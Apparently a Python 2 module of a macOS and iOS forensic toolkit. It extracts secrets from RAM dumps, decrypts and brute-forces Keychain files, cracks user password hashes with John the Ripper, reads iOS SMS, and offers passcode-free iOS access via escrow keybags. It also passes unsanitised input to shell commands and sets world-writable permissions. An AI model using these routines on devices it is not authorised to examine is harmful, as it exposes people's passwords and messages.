					request = "Subject:%s \n  Date:%s \n  Sender:%s \n  Message:%s  \n  Emlx ID:%s \n  Mbox:%s \n" % (row["subject"],datetime.datetime.fromtimestamp(int(date_created[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["address"],row["snippet"],row["rowid"],row["url"])
					print_green(request)
					to_record = "\n" + request.encode('utf-8')
					fct_writefile(to_record, output_display)

				counter = counter + 1
				if counter == 5 and jump == 0 : 
					res=raw_input("Press enter to continue (j to jump) > ")
					counter = 0
					if res == 'j':
						jump = 1
	except lite.Error, e:	    
	    print_red("Error %s:" % e.args[0])	
	finally:
	    if con:
	        con.close()

	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")



def fct_search_emlx():

	if os.path.isfile(file_log_email) :
		print_log("Available Mail Boxes > ")
		
		file=open(file_log_email,'r')
		lines_all = file.readlines()
		file.close()

		tab_mbox_path = []
		tab_mbox = []

		filtre = re.compile('\[DUMP_(.*)_EMAILS\].+\ to\ (.*)$',re.IGNORECASE)

		#backup of path to mbox into tab_mbox and tab_mbox_path
		for file_id in range(len(lines_all)) :
			res = filtre.findall(lines_all[file_id])
			for i in res:
				print_green(str(file_id) + ". " + i[0] + " >> " + i[1])
				tab_mbox_path.append(i[1])
				tab_mbox.append(i[0])

		selected_mbox_tab=[]
		selected_mbox = "null"
		empty_box = "1"
		print_log('Choose Mail Boxes (one per line) and finish with "."')
		while selected_mbox != "." :
			selected_mbox = raw_input("> ")
			try:
				if selected_mbox != "." and selected_mbox != "" and int(selected_mbox) < len(tab_mbox): 
					empty_box = "0"
					selected_mbox_tab.append(selected_mbox.strip())
			except ValueError:
				print_red("\nPlease to choose a valid Mail Box\n")

		if empty_box == "1": 
			print_log("No selected Mail Box. ")

		emlx_to_find = "null"
		
		while emlx_to_find != "b.emlx":
			emlx_to_find=raw_input("\nEnter the Emlx ID to search (b to back) > ")
			emlx_to_find=emlx_to_find + ".emlx"

			if emlx_to_find != "b.emlx":
				#for each selected reasearching
				for i in range(len(selected_mbox_tab)):
					name_box = tab_mbox[int(selected_mbox_tab[i])]
					path_to_mbox = tab_mbox_path[int(selected_mbox_tab[i])]

					print_green("\n========================================================================")
					print_log("Researching " + emlx_to_find + " into " + name_box + " \n>>" + path_to_mbox)
					path_to_mbox = path_to_mbox.replace("\ ","\\")
					path_to_mbox = path_to_mbox.replace("\@","@")
					res_found_emlx = os.popen('find "' + path_to_mbox + '/" -name ' + emlx_to_find).read()
					if res_found_emlx.strip() != "":
						print_green("\nFile has been identified here : \n" + res_found_emlx.strip())
						print_green("\nAttempt to open this file with default mail application...")
						os.system("open " + res_found_emlx.strip())
					else:
						print_green("\nFile not found...")


	else :
		print_log("No Mail Box available ...")

	print_red("\n\n========================================================================")
	print_red("                      ==== \\Exploit EMAIL ====")
	print_red("========================================================================")


####################################################################################################################################
											#[Exploit memory dump]
####################################################################################################################################
def fct_search_ram() :

	print_red("\n\n========================================================================")
	print_red("                   ==== Exploit Ram dump ====")
	print_red("========================================================================")
	list_functions_RAM=["Search Apple secrets","RAM_MacOSx_Cred-0.1.py", "Search Web secrets (signatures can be outdated)", "RAM_Web_Cred-0.1.py"]
	if os.path.isfile(file_dump_RAM) or os.path.isfile(file_str_RAM) : 
		print_log("RAM dump has been made :)")
		
		if os.path.isfile(file_str_RAM) :
			print_log("STRINGS dump has been made :)")
			print_green("========================================================================")
			print_log("Available functions to exploit strings into RAM > ")

			id_function_RAM = "null"
			while id_function_RAM == "null":
				for i in range(len(list_functions_RAM)/2):
					i = 2 * i
					print_green(str(i/2) + ". " + list_functions_RAM[i])
				id_next = len(list_functions_RAM)/2
			
				print_green(str(id_next)	 + ". Are you lucky and find Web passwords ? (can take a long time)")
				id_function_RAM=raw_input("\nChoose a function (b to back) > ")
				print_log("Note : you can add your own keyword into " + db_web_pass)
				
				if id_function_RAM != "b":
					try:
						intORnot=int(id_function_RAM)
						if int(id_function_RAM) == int(id_next):
							#Are you lucky ?
							date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
							password_web = name_dir_analysis + date_display + "_PASSWORDS_WEB.txt"

							if os.path.isfile(password_web) :
								res_clear = raw_input("Do you want to clear previous result ? > [y]/n")
								if res_clear == "n" : fct_search_ram()
								else : os.system('rm ' + password_web)

							file_pass_web = open(db_web_pass,'r')
							lines_web_pass = file_pass_web.readlines()
							file_pass_web.close()

							for j in range(len(lines_web_pass)):
								print_log("\nSearching of keyword: " + lines_web_pass[j].strip("\n") + "\n ... be patient :)")

								res_find_pass = os.popen("cat " + file_str_RAM + " | grep -i '" + lines_web_pass[j].strip("\n") + "'").read()
								print_green(res_find_pass)
								fct_writefile("\n====================\nSearching of keyword: " + lines_web_pass[j].strip("\n") + "\n====================\n",password_web)
								fct_writefile(res_find_pass, password_web)
								print_log("Results are stored into " + password_web)
							id_function_RAM = "null"
					
						elif int(id_function_RAM) > 2: 
							id_function_RAM = "null"
							print_red("\nPlease to choose a valid option\n")

						else:
							name_function_RAM = list_functions_RAM[(int(id_function_RAM))*2]
							name_software = list_functions_RAM[(int(id_function_RAM))*2 +1]
							
							print_green("========================================================================")
							print_log("[" + name_function_RAM + "] with " + name_software)
							os.system(dir_tools + name_software + " " + file_str_RAM)
							print_log("[\\" + name_function_RAM + "] with " + name_software)
							id_function_RAM = "null"
					
					except ValueError:
						print_red("\nPlease to choose a valid option \n")
						id_function_RAM = "null"
		else: 
			print_log("No STRINGS dump ...")
			print_log("Be patient, creation of STRINGS dump from RAW dump ...")
			os.system('cat ' + file_dump_RAM + '| strings > ' + file_str_RAM)
			print_log("Strings dump is stored into " + file_str_RAM)
			print_log("Please to re-launch Option <Exploit RAM memory Dump> to identify secrets ...:)")
	
	else:
		print_log("\nNo RAM image has been made :(")

	print_red("\n========================================================================")
	print_red("                   ==== \\Exploit Ram Dump ====")
	print_red("========================================================================")
	


####################################################################################################################################
											#[exploit keychain]
####################################################################################################################################
def fct_display_password(keychain_name,file_keychain_decrypted):
	keychain_to_analyse=name_dir_analysis + keychain_name
	print_green("========================================================================")
	print_log("Available data into " + keychain_to_analyse + ">")
	file=open(file_keychain_decrypted,'r')
	lines_keychain=file.readlines()
	file.close()
	file_keychain_password=file_keychain_decrypted.replace("decrypted.txt","keychain.txt").replace("keychain_","passwords_")
	tag = "data:"
	j=0
	for i in range(len(lines_keychain)):
		lines_keychain[i]=lines_keychain[i].strip("\n")
		if j == 1 and len(lines_keychain[i]) <= size_pass_keychain and lines_keychain[i] != "":
			#print_green("Password: XXXXXXXXXXXXXXXXXXXX")
			print_green("Password: " + lines_keychain[i].strip("\"")+"\n")
			fct_writefile("Password: " + lines_keychain[i].strip("\"")+"\n", file_keychain_password)
			fct_add_pass_database(lines_keychain[i].strip("\"")+"\n")
			j = 0
		elif "data:" in lines_keychain[i]:
			j = 1
		else : 
			j = 0
			filtre = re.compile('0x00000007\ \<blob\>\=\"(.+)\"',re.IGNORECASE)
			res = filtre.findall(lines_keychain[i])
			for k in res:
				print_green("\nTarget: " + k)
				fct_writefile("\nTarget: " + k.strip("\"")+"\n", file_keychain_password)

			filtre = re.compile('\"acct\"\<blob\>\=\"(.+)\"',re.IGNORECASE)
			res = filtre.findall(lines_keychain[i])
			for k in res:
				print_green("Login: " + k)
				fct_writefile("Login: " + k.strip("\"")+"\n", file_keychain_password)

	print_log("\nDecrpyted password into Keychain are stored into " + file_keychain_password)
	print_green("========================================================================\n")


def fct_unlock_keychain(dir_dump_keychain,keychain_name):
	keychain_to_analyse = dir_dump_keychain + keychain_name
	keychain_pass=raw_input("Enter the password (b to back) > ").strip("\n")
	
	if keychain_pass != 'b': 
		#lock keychain if open
		os.system('security lock-keychain "' + current_path + '/' + keychain_to_analyse + '"')
		print('security unlock-keychain -p ' + keychain_pass + ' "' + current_path + '/' + keychain_to_analyse + '"')
		res_unlock_keychain=commands.getoutput('security unlock-keychain -p ' + keychain_pass + ' ' + current_path + '/' + keychain_to_analyse)
		#res_unlock_keychain=os.popen('security unlock-keychain -p ' + keychain_pass + ' ' + current_path + '/' + keychain_to_analyse).read()
		print res_unlock_keychain
		
		#valid password
		if res_unlock_keychain == "":
			data_keychain=os.popen('security dump-keychain -d "' + current_path + '/' + keychain_to_analyse + '"').read()
			file_keychain_decrypted=name_dir_analysis + keychain_name.replace(".keychain","_decrypted.txt")
			#write keychain in clear into file
			fct_writefile_del(data_keychain, file_keychain_decrypted)
			print_green("========================================================================")
			print_log("Available data into " + keychain_to_analyse + ">")
			#read keychain file in clear
			file = open(file_keychain_decrypted,'r')
			lines_keychain = file.readlines()
			file.close()
			i = 0
			for i in range(len(lines_keychain)):
				lines_keychain[i] = lines_keychain[i].strip("\n")
				print_green (lines_keychain[i])
			print_log("Decrypted keychain is stored into " + file_keychain_decrypted) 
			print_green("========================================================================\n")
			
			
		# no valid password
		else:
			print_log("The entered password is not correct ...")
			#fct_unlock_keychain(dir_dump_keychain,keychain_name)
			return("password_false")
	
	#b to back
	else:
		return("b")
	return(file_keychain_decrypted)



def fct_brute_pass_keychain(dir_dump_keychain,keychain_name,all_passwords):
	check_found_pass = 0
	start_time = time.clock()
	
	if check_found_pass != 1:
		for i in range(len(all_passwords)):
			keychain_to_analyse = dir_dump_keychain + keychain_name
			res_unlock_keychain = commands.getoutput('security unlock-keychain -p "' + all_passwords[i].strip("\n").strip("\r")+ '" "' + current_path + '/' + keychain_to_analyse + '"')

			if res_unlock_keychain == "":
				check_found_pass = 1
				pass_found = all_passwords[i].strip("\n").strip("\r")
				print_green("\nFound password : " +  pass_found + "\n")
				duration = time.clock() - start_time
				duration = duration * 100
				print_log ("Duration of bruteforce : " + str(duration) + " seconds")
				print_log("Keychain can be opened :)")

				date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_KEYCHAIN.txt"
				fct_writefile("\nFound password : " +  pass_found + " for Keychain " + keychain_name,file_crackedhashes)
				fct_add_pass_database(pass_found)
				break						

	# no found password with bruteforce
	if check_found_pass == 0: 
		print_green("\nNo Found password …\n")
		duration = time.clock() - start_time
		duration = duration*100
		print_log ("Duration of bruteforce : " + str(duration) + " seconds")
		print_log("Keychain cannot be opened :(")
		print_green("========================================================================\n")


def fct_keychain_with_john(dir_dump_keychain,keychain_name):

	#convert keychain_to_john
	keychain_to_analyse = dir_dump_keychain + keychain_name
	hash_keychain = os.popen(dir_path_jtr + '/keychain2john ' + keychain_to_analyse.strip("\n")).read().strip("\n")
	backup_hash_keychain = name_dir_analysis + "keychain_hash_" + keychain_name + ".txt"
	fct_writefile_del(hash_keychain,backup_hash_keychain)

	var_john = "null"
	while var_john == "null":
		print_green("\n1: Launch John the ripper with special list(" + file_wordlist_for_jtr + ")")
		print_green("2: Launch John The Ripper with found passwords(" + dir_passwords + "ALL-passwords_x.txt)")
		print_green("3: Launch John The Ripper with default mode")
		print_green("4: Launch John the ripper with --rules:single and found passwords(very efficient)")
		var_john=raw_input("\nBruteforce attack to launch (b to back) > ")

		if var_john != "b":
			if var_john == "1": 
				print_log("Be patient, attempt to identity keychain password with special list <" + file_wordlist_for_jtr +  "> ... (ctrl+c to cancel)")
				os.system(dir_path_jtr + "/john " + backup_hash_keychain +  " --wordlist=" + file_wordlist_for_jtr)
				print_green("========================================================================")
				print_log("The identified keychain:password is the following > ")
				var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + backup_hash_keychain).read().strip("\n")
				print_green(var_crackedhashes)

				date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_KEYCHAIN.txt"

				fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
				print_log("Password is stored into " + file_crackedhashes)
				print_green("========================================================================")
				var_all_passwords = os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
				fct_add_pass_database(var_all_passwords)
				var_john = "null"

			elif var_john == "2": 
				date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				file_backup_pass = name_dir_analysis + date_display + "_ALL_FOUND_PASSWORDS.txt"
				found_password = fct_generate_password(1)
				for index_tab in range(len(found_password)):
					fct_writefile("\n" + found_password[index_tab].strip("\n"),file_backup_pass)

				if os.path.isfile(file_backup_pass):
					print_log("Be patient, attempt to identity keychain password with found passwords " + file_backup_pass + " ... (ctrl+c to cancel)")
					os.system(dir_path_jtr + "/john " + backup_hash_keychain +  " --wordlist=" + file_backup_pass)
					print_green("========================================================================")
					print_log("The identified keychain:password is the following > ")
					var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + backup_hash_keychain).read().strip("\n")
					print_green(var_crackedhashes)
					
					date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
					file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_KEYCHAIN.txt"
					fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
					print_log("Password is stored into " + file_crackedhashes)
					print_green("========================================================================")
					var_all_passwords=os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
					fct_add_pass_database(var_all_passwords)
					var_john = "null"
			
			elif var_john == "3": 
				print_log("\nBe patient, attempt to identity keychain password with default mode ... (ctrl+c to cancel)")
				os.system(dir_path_jtr + "/john " + backup_hash_keychain)
				print_green("========================================================================")
				print_log("The identified keychain:password is the followings > ")
				var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + backup_hash_keychain).read().strip("\n")
				print_green(var_crackedhashes)
				
				date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_KEYCHAIN.txt"
				fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
				print_log("Password is stored into " + file_crackedhashes)
				print_green("========================================================================")
				var_all_passwords=os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
				fct_add_pass_database(var_all_passwords)
				var_john = "null"

			elif var_john == "4": 
				date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				file_backup_pass = name_dir_analysis + date_display + "_ALL_FOUND_PASSWORDS.txt"
				found_password = fct_generate_password(1)
				for index_tab in range(len(found_password)):
					fct_writefile("\n" + found_password[index_tab].strip("\n"),file_backup_pass)
				
				if os.path.isfile(file_backup_pass):
					print_log("\nBe patient, attempt to identity keychain password with rules 'single' and wordlist " + file_backup_pass + "  ... (ctrl+c to cancel)")
					os.system(dir_path_jtr + "/john --rules:single --wordlist="  + file_backup_pass + " " + backup_hash_keychain)
					print_green("========================================================================")
					print_log("The identified keychain:password is the following > ")
					var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + backup_hash_keychain).read().strip("\n")
					print_green(var_crackedhashes)
				
					date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
					file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_KEYCHAIN.txt"
					fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
					print_log("Password is stored into " + file_crackedhashes)
					print_green("========================================================================")
					var_all_passwords=os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
					fct_add_pass_database(var_all_passwords)
					var_john = "null"

			else: 
				print_red("\nPlease to choose a valid option")
				var_john = "null"

		os.system("chmod -Rf 777 " + dir_path_jtr)


def fct_exploit_keychain():

	print_red("\n\n========================================================================")
	print_red("                   ==== Exploit Keychain files ====")
	print_red("========================================================================")
	
	if os.path.exists(file_log_keychain):

		file = open(file_log_keychain,'r')
		lines_log_keychain = file.readlines()
		file.close()

		tab_results = []
		
		filtre = re.compile('^.+\ to\ (.+)\/(.+\.keychain)$',re.IGNORECASE)

		for i in range(len(lines_log_keychain)):
			res = filtre.findall(lines_log_keychain[i])

			for one_line in res:
				path_file_db = one_line[0]
				file_db = one_line[1]
				tab_results.append(file_db)

		keychain_to_analyse = "null"
		while keychain_to_analyse == "null":	
			print_log("\nAvailable Keychain files > ")
			for j in range(len(tab_results)):print_green(str(j) + ". " + tab_results[j])

			keychain_to_analyse = raw_input("\nChoose a keychain (b to back) > ")
			
			if keychain_to_analyse != "b" : 
				try:
					intORnot = int(keychain_to_analyse)
					if int(keychain_to_analyse) < len(tab_results):
						keychain_name = tab_results[int(keychain_to_analyse)]
						keychain_to_analyse = dir_dump_keychain + keychain_name

						print_log  ("Analysis of : " + keychain_to_analyse)
						print_green("========================================================================")

						var_keychain_action = "null"
						while var_keychain_action == "null":
							print_green("\n1: Open Keychain with the password and display content")
							print_green("2: Attempt to identity Keychain password with John The Ripper")
							print_green("3: Attempt to identity Keychain password with homemade Algorithm")
							
							var_keychain_action = raw_input("\nAnalysis to launch (b to back) > ")

							if var_keychain_action != "b":
								#open keychain with password
								if var_keychain_action == "1":
									file_keychain_decrypted = 'password_false'
									while file_keychain_decrypted == 'password_false':
										file_keychain_decrypted=fct_unlock_keychain(dir_dump_keychain,keychain_name)
									if file_keychain_decrypted != "b":
										var_display_pass = raw_input("Do you want to backup found password ? y/[n] > ")
										if var_display_pass == "y" : 
											fct_display_password(keychain_name,file_keychain_decrypted)
									var_keychain_action = "null"
								#with john
								elif var_keychain_action == "2":
									fct_keychain_with_john(dir_dump_keychain,keychain_name)
									var_keychain_action = "null"
								#with my homemade algo
								elif var_keychain_action == "3":
									all_passwords=fct_generate_password(0)
									print_log("Search into main passwords database ("+ dir_passwords + " + " + file_password_personnal + ") " + str(len(all_passwords)) + " passwords), be patient")
									#lock keychain if open
									os.system('security lock-keychain ' + current_path + '/' + keychain_to_analyse)
									fct_brute_pass_keychain(dir_dump_keychain,keychain_name,all_passwords)
									var_keychain_action = "null"
								else:
									print_red("\nPlease to choose a valid option")
									var_keychain_action = "null"

						keychain_to_analyse = "null"
					else:
						print_red("\nPlease to choose a valid Keychain file\n")
						keychain_to_analyse = "null"
				except ValueError:
					print_red("\nPlease to choose a valid Keychain file\n")
					keychain_to_analyse = "null"

	else: 
		print_log("No recording ...")
	
	print_red("\n========================================================================")
	print_red("                   ==== \\Exploit Keychain files ====")
	print_red("========================================================================\n")
	


####################################################################################################################################
											#[exploit hashes]
####################################################################################################################################
def fct_exploit_password():
	print_red("\n\n========================================================================")
	print_red("                ==== Crack Hashes passwords ====")
	print_red("========================================================================")
	
	if os.path.exists(file_allusershashes):

		print_log("Hashes passwords to crack [" + file_allusershashes + "] : \n")
		file = open(file_allusershashes,'r')
		lines_hashes = file.readlines()
		file.close()

		for i in range(len(lines_hashes)) :
			print_log(lines_hashes[i].strip("\n"))
		
		var_john = "null"
		while var_john == "null":
			print_green("\n1: Launch John The Ripper with special list(" + file_wordlist_for_jtr + ")")
			print_green("2: Launch John The Ripper with found passwords(" + dir_passwords + "ALL-passwords_x.txt)")
			print_green("3: Launch John The Ripper with default mode")
			print_green("4: Launch John The Ripper with --rules:single and found passwords(very efficient)")
			var_john=raw_input("\nBruteforce attack to launch (b to back) > ")

			if var_john != "b":
				if var_john == "1": 
					print_log("Be patient, attempt to crack the passwords with special list <" + file_wordlist_for_jtr +  "> ... (ctrl+c to cancel)")
					os.system(dir_path_jtr + "/john " + file_allusershashes +  " --wordlist=" + file_wordlist_for_jtr)
					print_green("========================================================================")
					print_log("The identified usernames:passwords are the followings > ")
					var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
					print_green(var_crackedhashes)

					date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
					file_crackedhashes = name_dir_analysis + date_display + "_PASSWORDS_USER.txt"

					fct_writefile(var_crackedhashes,file_crackedhashes)
					print_log("Passwords are stored into " + file_crackedhashes)
					print_green("========================================================================")
					var_all_passwords = os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
					fct_add_pass_database(var_all_passwords)
					var_john = "null"

				elif var_john == "2":

					date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
					file_backup_pass = name_dir_analysis + date_display + "_ALL_FOUND_PASSWORDS.txt"
					found_password = fct_generate_password(1)
					for index_tab in range(len(found_password)):
						fct_writefile("\n" + found_password[index_tab].strip("\n"),file_backup_pass)

					if os.path.isfile(file_password_database):
						print_log("Be patient, attempt to crack the passwords with found passwords " + file_backup_pass + " ... (ctrl+c to cancel)")
						os.system(dir_path_jtr + "/john " + file_allusershashes +  " --wordlist=" + file_backup_pass)
						print_green("========================================================================")
						print_log("The identified usernames:passwords are the followings > ")
						var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
						print_green(var_crackedhashes)
					
						date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
						file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_USERS.txt"
						fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
						print_log("Passwords are stored into " + file_crackedhashes)
						print_green("========================================================================")
						var_all_passwords=os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
						fct_add_pass_database(var_all_passwords)
						var_john = "null"
				
				elif var_john == "3": 
					print_log("Be patient, attempt to crack the passwords with default mode ... (ctrl+c to cancel)")
					os.system(dir_path_jtr + "/john " + file_allusershashes)
					print_green("========================================================================")
					print_log("The identified usernames:passwords are the followings > ")
					var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
					print_green(var_crackedhashes)
					
					date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
					file_crackedhashes = name_dir_analysis + date_display + "_PASSWORD_USERS.txt"
					fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
					print_log("Passwords are stored into " + file_crackedhashes)
					print_green("========================================================================")
					var_all_passwords = os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
					fct_add_pass_database(var_all_passwords)
					var_john = "null"

				elif var_john == "4": 
					date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
					file_backup_pass = name_dir_analysis + date_display + "_ALL_FOUND_PASSWORDS.txt"
					found_password = fct_generate_password(1)
					for index_tab in range(len(found_password)):
						fct_writefile("\n" + found_password[index_tab].strip("\n"),file_backup_pass)
					
					if os.path.isfile(file_backup_pass):
						print_log("\nBe patient, attempt to crack the passwords with rules 'single' and wordlist " + file_backup_pass + "  ... (ctrl+c to cancel)")
						os.system(dir_path_jtr + "/john --rules:single --wordlist="  + file_backup_pass + " " + file_allusershashes)
						print_green("========================================================================")
						print_log("The identified username:passwords are the followings > ")
						var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
						print_green(var_crackedhashes)
					
						date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
						file_crackedhashes = name_dir_analysis + date_display + "_PASSWORDS_USERS.txt"
						fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
						print_log("Passwords are stored into " + file_crackedhashes)
						print_green("========================================================================")
						var_all_passwords=os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort -u").read()
						fct_add_pass_database(var_all_passwords)
						var_john = "null"

				else: 
					print_red("\nPlease to choose a valid option")
					var_john = "null"

			os.system("chmod -Rf 777 " + dir_path_jtr)

	else:
		print_log("No recording ... \n\nPlease to extract manually the hashes stored in the directory \n'results/xx/history_net_sys_dump/Hashes_10.x', if your Dump has been launched with Target Mode.\n\n")
		print_log("For [Hashes_10.7_8] <USER>.plist file contains hash password")
		print_log("   On 10.8, extract hashes with John tool : ml2john.py")
		print_log("\nFor [Hashes_10.6] <UID> file contains hash password")

	print_red("\n========================================================================")
	print_red("                ==== \\Crack Hashes passwords ====")
	print_red("========================================================================")


####################################################################################################################################
											#[Exploit iOS files]
####################################################################################################################################
def fct_read_ios_sms(base_db,version_ios):
	print_red("\n     ==== SMS of " + base_db + "====\n")
	base_path_sms = dir_dump_ios + "IOS_SMS-" + base_db
	db_file_sms = base_path_sms + "_3d0d7e5fb2ce288813306e4d4636395e047a3d28"

	if os.path.isfile(db_file_sms):
		#to record
		var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
		output_display = name_dir_analysis + var_date_display + "_IOS_SMS-" + base_db + ".txt"
		print_log("\nResults will be stored into " + output_display + "\n")
		raw_input("Press enter to continue\n")

		con = None
		try:
			con = lite.connect(db_file_sms)
			with con:
				con.row_factory = lite.Row
				cur = con.cursor()

				if "6." in version_ios:
					sql_request = "SELECT message.date,message.is_from_me,message.handle_id,handle.ROWID,handle.id,message.ROWID,message.text FROM message,handle WHERE (message.handle_id=handle.ROWID)"						
					cur.execute(sql_request)
					rows = cur.fetchall()
					counter = 0
					jump = 0

					for row in rows:
						date = int(row["date"]) + 978307200
						date = str(date)

						if int(row["is_from_me"]) == 1:
							request = "Date:%s \n  To:%s \n  Message:%s \n " % (datetime.datetime.fromtimestamp(int(date[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["id"],row["text"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)
						else:
							request = "Date:%s \n  From:%s \n  Message:%s \n " % (datetime.datetime.fromtimestamp(int(date[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["id"],row["text"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)

						counter = counter + 1
						if counter == 5 and jump == 0 : 
							res=raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1

				elif "4." in version_ios:
					sql_request = "SELECT date,flags,address,text FROM message"						
					cur.execute(sql_request)
					rows = cur.fetchall()
					counter = 0
					jump = 0

					for row in rows:
						date = str(row["date"])
						
						if int(row["flags"]) == 2:
							request = "Date:%s \n  From:%s \n  Message:%s \n " % (datetime.datetime.fromtimestamp(int(date[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["address"],row["text"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)
						else:
							request = "Date:%s \n  To:%s \n  Message:%s \n " % (datetime.datetime.fromtimestamp(int(date[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["address"],row["text"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display)

						counter = counter + 1
						if counter == 5 and jump == 0 : 
							res=raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1

			print_log("\nResults are stored into " + output_display + "\n")
			raw_input("Press any key to continue...")
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])

		finally:
		    if con:
		        con.close()
	else:
		print_log("No recorded SMS ...\n")


def fct_read_ios_calendar(base_db,version_ios):
	print_red("\n     ==== Calendar of " + base_db + "====\n")
	base_path_calendar = dir_dump_ios + "IOS_CALENDAR-" + base_db
	db_file_calendar = base_path_calendar + "_2041457d5fe04d39d0ab481178355df6781e6858"
	if os.path.isfile(db_file_calendar):
		print_red("Please to open manually SQLite database:")
		print_green(db_file_calendar + "\n")
	else:
		print_log("No recorded calendar ...\n")


def fct_read_ios_call(base_db,version_ios):
	print_red("\n     ==== Call history of " + base_db + "====\n")
	base_path_call = dir_dump_ios + "IOS_CALL-" + base_db
	db_file_call = base_path_call + "_2b2b0084a1bc3a5ac8c27afdf14afb42c61a19ca"
	if os.path.isfile(db_file_call):
		print_red("Please to open manually SQLite database:")
		print_green(db_file_call + "\n")
	else:
		print_log("No recorded history call ...\n")


def fct_read_ios_contact(base_db,version_ios):
	print_red("\n     ==== Address Book of " + base_db + "====\n")
	base_path_contact = dir_dump_ios + "IOS_ADDRESS_BOOK-" + base_db
	db_file_contact = base_path_contact + "_31bb7ba8914766d4ba40d6dfb6113c8b614be442"
	if os.path.isfile(db_file_contact):
		print_red("Please to open manually SQLite database:")
		print_green(db_file_contact + "\n")
	else:
		print_log("No recorded Address Book ...\n")



def fct_exploit_iPhone() :
	print_red("\n\n========================================================================")
	print_red("                   ==== Exploit iOS files ====")
	print_red("========================================================================")

	if os.path.exists(dir_ios_devices):
		var_analysis = "null"
		while var_analysis == "null":
			print_green("\n1: Access to iOS devices without passcode (Escrow Keybag)")
			print_green("2: Read secrets through backups iTunes")
			print_green("b: Back")
			var_analysis = raw_input("\nAnalysis to launch > ")
			if var_analysis != "b":
				if var_analysis == "1":
					fct_exploit_Lockdown()
					var_analysis = "null"
				elif var_analysis == "2" : 
					fct_exploit_iTunes_Backup()
					var_analysis = "null"
				else:
					var_analysis = "null"
					print_red("\nPlease to choose a valid option\n")
	else:
		print_log("No recording ...")

	print_red("\n========================================================================")
	print_red("                   ==== \\Exploit iOS files ====")
	print_red("========================================================================")


def fct_exploit_iTunes_Backup() :
	
	if os.path.exists(file_log_ios) :
		file=open(file_log_ios,'r')
		lines_log_ios = file.readlines()
		file.close()

		tab_results = []
		tab_version = []
		
		filtre = re.compile('^.+\ to\ (.+)\/(.+)_Info\.plist$',re.IGNORECASE)
		for i in range(len(lines_log_ios)):
			res = filtre.findall(lines_log_ios[i])
			for one_line in res:
				path_file_db = one_line[0]
				file_db = one_line[1]
				tab_results.append(file_db)

		#for each plist file
		ios_backup_to_analyse = "null"
		while ios_backup_to_analyse == "null":
			print_log("\nAvailable iOS Backup by itunes >")
			for index_tab_plist in range(len(tab_results)):
				plist_path = dir_dump_ios + tab_results[index_tab_plist] + '_Info.plist'
				file=open(plist_path,'r')
				lines_plist = file.readlines()
				file.close
				print_next = 0
				detect_version = 0
				print_green(str(index_tab_plist) + ". " + tab_results[index_tab_plist].replace("info_plist-","").replace("ios_",""))
				for index_plist in range(len(lines_plist)):
					if print_next == 1:
						print_log(lines_plist[index_plist].strip('\n').replace("<string>","").replace("</string>",""))
						print_next = 0
						if detect_version == 1:
							tab_version.append(lines_plist[index_plist])
							detect_version = 0
						continue
